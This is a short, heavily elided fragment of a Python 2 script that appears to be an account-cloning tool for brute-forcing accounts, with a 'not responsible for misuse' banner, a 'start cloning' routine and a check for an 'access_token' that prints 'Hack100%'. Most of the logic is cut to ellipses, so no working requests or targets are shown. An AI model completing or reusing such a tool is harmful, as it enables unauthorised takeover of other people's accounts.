...
print  """
\033[1;91m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR WAHEED KHAN 💕 ~
\033[1;93m************************************************

USA ACCOUNTS CLONE 2
...
def pilih_super():
	...
	jalan('           \033[1;91mWK KHAN ✔start cloning Wait...')
	print  "  \033[1;93m ●══════════════════◄►══════════════════●" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;93m[  ✓  ] \x1b[1;93mHack100%💉'											
